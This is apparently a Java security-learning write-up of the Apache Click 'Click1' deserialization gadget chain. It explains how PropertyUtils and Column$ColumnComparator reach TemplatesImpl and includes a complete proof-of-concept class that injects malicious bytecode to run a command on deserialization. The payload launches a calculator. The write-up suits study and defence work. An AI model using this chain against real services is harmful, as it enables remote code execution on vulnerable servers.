# Java Security Learning—Click Chain

Author: H3rmesk1t

Data: 2022.03.16

# Click Introduction
[Apache Click](https://click.apache.org/) is a modern JEE web application framework, providing a natural rich client style programming model. Apache Click is designed to be very easy to learn and use, with developers getting up and running within a day.

#Environmental construction

```xml
<dependencies>
    <dependency>
        <groupId>org.apache.click</groupId>
        <artifactId>click-nodeps</artifactId>
        <version>2.3.0</version>
    </dependency>
</dependencies>
```

# Pre-knowledge
## PropertyUtils
In `click`, there is a tool class `org.apache.click.util.PropertyUtils`, which is used to operate properties. There is a `getValue` method to obtain the value of a property in an object. Use `name` to get the property name, and then the `getObjectPropertyValue` method will be called, and the object instance, property name and method cache are passed in three parameters.

```java
public static Object getValue(Object source, String name) {
    String basePart = name;
    String remainsPart = null;
    if (source instanceof Map) {
        return ((Map)source).get(name);
    } else {
        int baseIndex = name.indexOf(".");
        if (baseIndex != -1) {
            basePart = name.substring(0, baseIndex);
            remainingPart = name.substring(baseIndex + 1);
        }

        Object value = getObjectPropertyValue(source, basePart, GET_METHOD_CACHE);
        return remainingPart != null && value != null ? getValue(value, remainingPart, GET_METHOD_CACHE) : value;
    }
}
```

In the `getObjectPropertyValue` method, the `getter` method with the specified property name is obtained in the incoming object instance, and then called through reflection. That is, the `PropertyUtils#getValue` method can trigger the `getter` method of the specified property, which can be used to trigger the utilization of the `TemplatesImpl` chain.

```java
private static Object getObjectPropertyValue(Object source, String name, Map cache) {
    PropertyUtils.CacheKey methodNameKey = new PropertyUtils.CacheKey(source, name);
    Method method = null;

    try {
        method = (Method)cache.get(methodNameKey);
        if (method == null) {
            method = source.getClass().getMethod(ClickUtils.toGetterName(name));
            cache.put(methodNameKey, method);
        }

        return method.invoke(source);
    } catch (NoSuchMethodException var13) {
        try {
            method = source.getClass().getMethod(ClickUtils.toIsGetterName(name));
            cache.put(methodNameKey, method);
            return method.invoke(source);
        } catch (NoSuchMethodException var11) {
            String msg;
            try {
                method = source.getClass().getMethod(name);
                cache.put(methodNameKey, method);
                return method.invoke(source);
            } catch (NoSuchMethodException var9) {
                msg = "No matching getter method found for property '" + name + "' on class " + source.getClass().getName();
                throw new RuntimeException(msg);
            } catch (Exception var10) {
                msg = "Error getting property '" + name + "' from " + source.getClass();
                throw new RuntimeException(msg, var10);
            }
        } catch (Exception var12) {
            String msg = "Error getting property '" + name + "' from " + source.getClass();
            throw new RuntimeException(msg, var12);
        }
    } catch (Exception var14) {
        String msg = "Error getting property '" + name + "' from " + source.getClass();
        throw new RuntimeException(msg, var14);
    }
}
```

## ColumnComparator
`org.apache.click.control.Column` is used to provide rendering of some properties of `<td>/<th>` in the table, implementing the `Serializable` interface, which can be deserialized. In `Column`, an internal class `ColumnComparator` is defined, which implements the `Comparator` interface, used to compare two `rows` in a `Column`.

<div align=center><img src="./images/1.png"></div>

When comparing, the getProperty method of `this.column` will be called again. When the `row` is not the `map` type, this method will call the `getValue` method of `PropertyUtils` to get the value. At this time, you can use the `PropertyUtils#getValue` method mentioned above to trigger the `getter` method of the specified property, and then trigger the use of the `TemplatesImpl` chain.

<div align=center><img src="./images/2.png"></div>

# POC

```java
package org.h3rmesk1t.Click;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javass
ist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.click.control.Column;
import org.apache.click.control.Table;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/16 12:59 am
 */
public class ClickExploit {

    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static byte[][] evilByteCodes() throws Exception {

        // Generate malicious bytecodes.
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\");";
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = classPool.makeClass("ClickExploit");
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        ctClass.makeClassInitializer().insertBefore(cmd);
        byte[] ctClassBytes = ctClass.toBytecode();
        return new byte[][]{ctClassBytes};
    }

    public static void main(String[] args) throws Exception {

        // Instantiate the class and set properties.
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_name", "h3rmesk1t");
        setFieldValue(templatesImpl, "_bytecodes", evilByteCodes());
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        // Initialize PriorityQueue.
        PriorityQueue<Object> queue = new PriorityQueue<>(2);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // Reflection puts TemplatesImpl in PriorityQueue.
        setFieldValue(queue, "queue", new Object[]{templatesImpl, templatesImpl});

        Class<?> clazz = Class.forName("org.apache.click.control.Column$ColumnComparator");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Column.class);
        constructor.setAccessible(true);

        Column column = new Column("outputProperties");
        // To avoid null pointers when deserializing comparisons, set a Table property for column.
        column.setTable(new Table());
        Comparator comparator = (Comparator) constructor.newInstance(column);

        // Reflection writes BeanComparator into PriorityQueue.
        setFieldValue(queue, "comparator", comparator);
        Field field2 = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field2.setAccessible(true);
        field2.set(queue, comparator);

        try {
            // Serialization
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(queue);
            objectOutputStream.close();

            // Deserialization
            ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (Exception e) {
            e.p
rintStackTrace();
        }
    }
}
```


# Call chain

```java
PriorityQueue.readObject()
    Column$ColumnComparator.compare()
        Column.getProperty()
            PropertyUtils.getValue()
                PropertyUtils.getObjectPropertyValue()
                    TemplatesImpl.getOutputProperties()
```

# Summarize
## Usage Instructions
The `PriorityQueue` deserialization triggers the `Compare` method of the `Column$ColumnComparator` class, which will call the `getValue` method of `PropertyUtils` to get the property value, and use the reflection to call the `getter` method to trigger the `TemplatesImpl` utilization chain.

## Gadget
 - kick-off gadget: java.util.PriorityQueue#readObject
 - sink gadget: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties
 - chain gadget: org.apache.click.control.Column$ColumnComparator#compare

# refer to
 - [Click1](https://su18.org/post/ysoserial-su18-5/#:~:text=clojure%20%3E%201.2.0-,Click1,-Apache%20Click%20%E6%98%AF)